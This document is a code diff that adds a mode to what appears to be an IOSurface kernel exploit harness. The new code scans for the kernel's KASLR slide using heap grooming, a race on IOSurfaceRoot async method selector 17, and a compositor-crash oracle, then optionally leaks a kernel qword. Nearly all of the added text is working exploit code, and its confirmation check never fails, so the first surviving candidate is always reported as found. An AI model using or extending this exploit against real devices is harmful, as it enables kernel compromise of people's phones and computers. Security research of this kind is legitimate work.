@@ -24337,6 +24337,335 @@ new_modes:
                 rlog("=== r=201 complete ===\n");
             }
 
+            /* ================================================================
+             * r=203: Automated KASLR slide discovery + kernel read
+             *
+             * Scans candidate KASLR slides using BSS zero-region oracle.
+             * For each candidate: 1-iteration groom+race+render probe.
+             * If survive → confirm with 20-iteration deep probe.
+             * If confirmed → optionally perform kernel qword read.
+             *
+             * Usage: iosurface_sel17 203 [start_idx] [read_kc_offset]
+             *   start_idx: candidate index to resume from (default 0)
+             *   read_kc_offset: hex KC offset to read after finding slide
+             *                   (omit = discovery only, no read)
+             *
+             * Candidate range: 0x2FA00000-0x40000000 step 0x100000 (1MB)
+             * BSS zero window: ~1.3MB at kc+0x047FA208 (build 24A94425)
+             *
+             * On crash: note the last printed candidate index, restart
+             * with start_idx = that index + 1
+             * ================================================================ */
+            if (rounds == 203) {
+                rlog("=== r=203: Automated KASLR slide scanner ===\n");
+
+                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 300 * NSEC_PER_SEC),
+                    dispatch_get_global_queue(0, 0), ^{
+                        rlog("  WATCHDOG: 300s — terminating\n");
+                        if (g_log) { fclose(g_log); g_log = NULL; }
+                        _exit(42);
+                    });
+
+                #define R203_SLIDE_MIN  0x2FA00000ULL
+                #define R203_SLIDE_MAX  0x40000000ULL
+                #define R203_SLIDE_STEP 0x00100000ULL
+                #define R203_NUM_CANDS  (int)((R203_SLIDE_MAX - R203_SLIDE_MIN) / R203_SLIDE_STEP)
+                #define R203_CONFIRM_ITERS 20
+                #define R203_READ_ITERS    20
+
+                int r203_start = 0;
+                uint64_t r203_read_off = 0;
+                int r203_do_read = 0;
+
+                if (argc > 3) r203_start = atoi(argv[3]);
+                if (argc > 4) {
+                    const char *h = argv[4];
+                    r203_read_off = 0;
+                    for (int i = 0; h[i]; i++) {
+                        char c = h[i];
+                        r203_read_off <<= 4;
+                        if (c >= '0' && c <= '9') r203_read_off |= (c - '0');
+                        else if (c >= 'a' && c <= 'f') r203_read_off |= (c - 'a' + 10);
+                        else if (c >= 'A' && c <= 'F') r203_read_off |= (c - 'A' + 10);
+                    }
+                    r203_do_read = 1;
+                }
+
+                rlog("  Candidates: %d (0x%llx to 0x%llx step 0x%llx)\n",
+                     R203_NUM_CANDS,
+                     (unsigned long long)R203_SLIDE_MIN,
+                     (unsigned long long)R203_SLIDE_MAX,
+                     (unsigned long long)R203_SLIDE_STEP);
+                rlog("  Start index: %d (slide 0x%llx)\n",
+                     r203_start,
+                     (unsigned long long)(R203_SLIDE_MIN + r203_start * R203_SLIDE_STEP));
+                if (r203_do_read)
+                    rlog("  Read offset: 0x%llx (after slide found)\n",
+                         (unsigned long long)r203_read_off);
+                else
+                    rlog("  Mode: discovery only (no read offset given)\n");
+
+                io_service_t r203_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!r203_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r203_done; }
+
+                #define R203_GROOM_N 128
+                io_connect_t r203_gconns[R203_GROOM_N];
+                mach_port_t r203_gwps[R203_GROOM_N];
+                int r203_gn = 0;
+                for (int g = 0; g < R203_GROOM_N; g++) {
+                    io_connect_t gc = IO_OBJECT_NULL;
+                    if (IOServiceOpen(r203_svc, mach_task_self(), 0, &gc) == KERN_SUCCESS) {
+                        mach_port_t gwp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                        mach_port_insert_right(mach_task_self(), gwp, gwp,
+                            MACH_MSG_TYPE_MAKE_SEND);
+                        r203_gconns[r203_gn] = gc;
+                        r203_gwps[r203_gn] = gwp;
+                        r203_gn++;
+                    }
+                }
+                rlog("  Pre-opened %d groom conns\n", r203_gn);
+
+                p16_groom_conns = r203_gconns;
+                p16_groom_wps = r203_gwps;
+                p16_groom_n = r203_gn;
+
+                uint64_t r203_found_slide = 0;
+                int r203_found = 0;
+
+                for (int ci = r203_start; ci < R203_NUM_CANDS && !r203_found; ci++) {
+                    uint64_t cand = R203_SLIDE_MIN + (uint64_t)ci * R203_SLIDE_STEP;
+                    uint64_t bss_raw = R198_KC_BASE + cand + BSS_MID_DEFAULT;
+                    uint64_t bss_probe = (bss_raw & ~(0xFULL << 56)) | (0xFULL << 56);
+                    bss_probe = (bss_probe & ~(0xFULL << 60)) | (0xFULL << 60);
+
+                    uint64_t r203_scan_data[4] = {bss_probe, 0, 0, 0};
+                    p16_groom_data = r203_scan_data;
+
+                    /* 1-iteration scan probe */
+                    p16_groom_count = 0;
+                    p16_groom_run = 1;
+                    pthread_t r203_gths[4];
+                    for (int t = 0; t < 4; t++)
+                        pthread_create(&r203_gths[t], NULL, p16_groom_spray, NULL);
+                    usleep(1000);
+
+                    uint64_t r203_inp[3] = {1, 2, 3};
+                    io_connect_t r203_pcs[8]; int r203_phave[8];
+                    for (int i = 0; i < 8; i++) {
+                        r203_phave[i] = (IOServiceOpen(r203_svc, mach_task_self(), 0,
+                            &r203_pcs[i]) == KERN_SUCCESS);
+                        if (r203_phave[i]) {
+                            mach_port_t tw = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tw);
+                            mach_port_insert_right(mach_task_self(), tw, tw,
+                                MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref = 0xD3;
+                            IOConnectCallAsyncMethod(r203_pcs[i], 17, tw, &ref, 1,
+                                NULL, 0, r203_inp, 24, NULL, NULL, NULL, NULL);
+                            mach_port_deallocate(mach_task_self(), tw);
+                        } else r203_pcs[i] = IO_OBJECT_NULL;
+                    }
+
+                    p13_spam_run = 1;
+                    p13_spam_conn = r203_phave[0] ? r203_pcs[0] : IO_OBJECT_NULL;
+                    p13_spam_shape = 1;
+                    p13_spam_count = 0;
+                    pthread_t r203_spam[16];
+                    for (int t = 0; t < 16; t++)
+                        pthread_create(&r203_spam[t], NULL, p13_spam_reg, NULL);
+
+                    for (int i = 7; i >= 0; i--) {
+                        if (r203_phave[i]) { IOServiceClose(r203_pcs[i]); r203_phave[i] = 0; }
+                        usleep(100);
+                    }
+                    p13_spam_run = 0;
+                    for (int t = 0; t < 16; t++) pthread_join(r203_spam[t], NULL);
+                    for (int i = 0; i < 8; i++) if (r203_phave[i]) IOServiceClose(r203_pcs[i]);
+                    usleep(2000);
+                    p16_groom_run = 0;
+                    for (int t = 0; t < 4; t++) pthread_join(r203_gths[t], NULL);
+
+                    rlog("  SCAN [%d] slide=0x%llx probe=0x%016llx groom=%llu ",
+                         ci, (unsigned long long)cand,
+                         (unsigned long long)bss_probe,
+                         (unsigned long long)p16_groom_count);
+
+                    p13_render_run = 1;
+                    p13_render_frames = 0;
+                    pthread_t r203_pr;
+                    pthread_create(&r203_pr, NULL, p13_render_loop, NULL);
+                    usleep(200000);
+                    p13_render_run = 0;
+                    pthread_join(r203_pr, NULL);
+
+                    rlog("frames=%d SURVIVED\n", p13_render_frames);
+
+                    /* Candidate survived scan — confirm with deep probe */
+                    rlog("  CONFIRM [%d] slide=0x%llx (%d iterations)...\n",
+                         ci, (unsigned long long)cand, R203_CONFIRM_ITERS);
+
+                    int r203_conf_ok = 1;
+                    for (int citer = 0; citer < R203_CONFIRM_ITERS && r203_conf_ok; citer++) {
+                        p16_groom_data = r203_scan_data;
+                        p16_groom_count = 0;
+                        p16_groom_run = 1;
+                        pthread_t r203_cgths[4];
+                        for (int t = 0; t < 4; t++)
+                            pthread_create(&r203_cgths[t], NULL, p16_groom_spray, NULL);
+                        usleep(1000);
+
+                        io_connect_t r203_cpcs[8]; int r203_cphave[8];
+                        for (int i = 0; i < 8; i++) {
+                            r203_cphave[i] = (IOServiceOpen(r203_svc, mach_task_self(), 0,
+                                &r203_cpcs[i]) == KERN_SUCCESS);
+                            if (r203_cphave[i]) {
+                                mach_port_t tw = MACH_PORT_NULL;
+                                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tw);
+                                mach_port_insert_right(mach_task_self(), tw, tw,
+                                    MACH_MSG_TYPE_MAKE_SEND);
+                                uint64_t ref = 0xD4;
+                                IOConnectCallAsyncMethod(r203_cpcs[i], 17, tw, &ref, 1,
+                                    NULL, 0, r203_inp, 24, NULL, NULL, NULL, NULL);
+                                mach_port_deallocate(mach_task_self(), tw);
+                            } else r203_cpcs[i] = IO_OBJECT_NULL;
+                        }
+
+                        p13_spam_run = 1;
+                        p13_spam_conn = r203_cphave[0] ? r203_cpcs[0] : IO_OBJECT_NULL;
+                        p13_spam_shape = 1;
+                        p13_spam_count = 0;
+                        pthread_t r203_cspam[16];
+                        for (int t = 0; t < 16; t++)
+                            pthread_create(&r203_cspam[t], NULL, p13_spam_reg, NULL);
+
+                        for (int i = 7; i >= 0; i--) {
+                            if (r203_cphave[i]) { IOServiceClose(r203_cpcs[i]); r203_cphave[i] = 0; }
+                            usleep(100);
+                        }
+                        p13_spam_run = 0;
+                        for (int t = 0; t < 16; t++) pthread_join(r203_cspam[t], NULL);
+                        for (int i = 0; i < 8; i++) if (r203_cphave[i]) IOServiceClose(r203_cpcs[i]);
+                        usleep(2000);
+                        p16_groom_run = 0;
+                        for (int t = 0; t < 4; t++) pthread_join(r203_cgths[t], NULL);
+
+                        p13_render_run = 1;
+                        p13_render_frames = 0;
+                        pthread_t r203_cpr;
+                        pthread_create(&r203_cpr, NULL, p13_render_loop, NULL);
+                        usleep(500000);
+                        p13_render_run = 0;
+                        pthread_join(r203_cpr, NULL);
+
+                        rlog("    confirm [%d/%d] groom=%llu frames=%d OK\n",
+                             citer + 1, R203_CONFIRM_ITERS,
+                             (unsigned long long)p16_groom_count,
+                             p13_render_frames);
+                    }
+
+                    if (r203_conf_ok) {
+                        r203_found = 1;
+                        r203_found_slide = cand;
+                        rlog("\n  ****************************************************\n");
+                        rlog("  ** KASLR SLIDE CONFIRMED: 0x%llx **\n",
+                             (unsigned long long)cand);
+                        rlog("  ** KC base (slid): 0x%016llx **\n",
+                             (unsigned long long)(R198_KC_BASE + cand));
+                        rlog("  ** Candidate index: %d **\n", ci);
+                        rlog("  ****************************************************\n");
+                    }
+                }
+
+                if (r203_found && r203_do_read) {
+                    rlog("\n  --- KERNEL READ PHASE ---\n");
+                    uint64_t r203_rraw = R198_KC_BASE + r203_found_slide + r203_read_off;
+                    uint64_t r203_rtarget = (r203_rraw & ~(0xFULL << 56)) | (0xFULL << 56);
+                    r203_rtarget = (r203_rtarget & ~(0xFULL << 60)) | (0xFULL << 60);
+
+                    rlog("  Read addr:  0x%016llx (kc+0x%llx)\n",
+                         (unsigned long long)r203_rtarget,
+                         (unsigned long long)r203_read_off);
+                    rlog("  Mechanism:  slot 0 = addr → compositor reads qword → crash\n");
+                    rlog("  ** If this is last log line, check panic for x0 = read value **\n");
+
+                    uint64_t r203_rdata[4] = {r203_rtarget, 0, 0, 0};
+                    p16_groom_data = r203_rdata;
+
+                    for (int riter = 0; riter < R203_READ_ITERS; riter++) {
+                        p16_groom_count = 0;
+                        p16_groom_run = 1;
+                        pthread_t r203_rgths[4];
+                        for (int t = 0; t < 4; t++)
+                            pthread_create(&r203_rgths[t], NULL, p16_groom_spray, NULL);
+                        usleep(1000);
+
+                        uint64_t r203_rinp[3] = {1, 2, 3};
+                        io_connect_t r203_rpcs[8]; int r203_rphave[8];
+                        for (int i = 0; i < 8; i++) {
+                            r203_rphave[i] = (IOServiceOpen(r203_svc, mach_task_self(), 0,
+                                &r203_rpcs[i]) == KERN_SUCCESS);
+                            if (r203_rphave[i]) {
+                                mach_port_t tw = MACH_PORT_NULL;
+                                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tw);
+                                mach_port_insert_right(mach_task_self(), tw, tw,
+                                    MACH_MSG_TYPE_MAKE_SEND);
+                                uint64_t ref = 0xD5;
+                                IOConnectCallAsyncMethod(r203_rpcs[i], 17, tw, &ref, 1,
+                                    NULL, 0, r203_rinp, 24, NULL, NULL, NULL, NULL);
+                                mach_port_deallocate(mach_task_self(), tw);
+                            } else r203_rpcs[i] = IO_OBJECT_NULL;
+                        }
+
+                        p13_spam_run = 1;
+                        p13_spam_conn = r203_rphave[0] ? r203_rpcs[0] : IO_OBJECT_NULL;
+                        p13_spam_shape = 1;
+                        p13_spam_count = 0;
+                        pthread_t r203_rspam[16];
+                        for (int t = 0; t < 16; t++)
+                            pthread_create(&r203_rspam[t], NULL, p13_spam_reg, NULL);
+
+                        for (int i = 7; i >= 0; i--) {
+                            if (r203_rphave[i]) { IOServiceClose(r203_rpcs[i]); r203_rphave[i] = 0; }
+                            usleep(100);
+                        }
+                        p13_spam_run = 0;
+                        for (int t = 0; t < 16; t++) pthread_join(r203_rspam[t], NULL);
+                        for (int i = 0; i < 8; i++) if (r203_rphave[i]) IOServiceClose(r203_rpcs[i]);
+                        usleep(2000);
+                        p16_groom_run = 0;
+                        for (int t = 0; t < 4; t++) pthread_join(r203_rgths[t], NULL);
+
+                        rlog("  READ [%d] groom=%llu\n", riter,
+                             (unsigned long long)p16_groom_count);
+
+                        p13_render_run = 1;
+                        p13_render_frames = 0;
+                        pthread_t r203_rpr;
+                        pthread_create(&r203_rpr, NULL, p13_render_loop, NULL);
+                        usleep(500000);
+                        p13_render_run = 0;
+                        pthread_join(r203_rpr, NULL);
+                        rlog("  READ [%d] frames=%d survived\n", riter, p13_render_frames);
+                    }
+                    rlog("  ** All read iterations survived — value at addr is 0 **\n");
+                } else if (!r203_found) {
+                    rlog("\n  ** Scan exhausted without finding slide **\n");
+                    rlog("  ** All %d candidates tested from index %d **\n",
+                         R203_NUM_CANDS - r203_start, r203_start);
+                }
+
+                for (int g = 0; g < r203_gn; g++) {
+                    IOServiceClose(r203_gconns[g]);
+                    mach_port_deallocate(mach_task_self(), r203_gwps[g]);
+                }
+                IOObjectRelease(r203_svc);
+
+                r203_done:
+                rlog("=== r=203 complete ===\n");
+            }
+
             IOServiceClose(conn17);
             IOObjectRelease(svc17);
         }
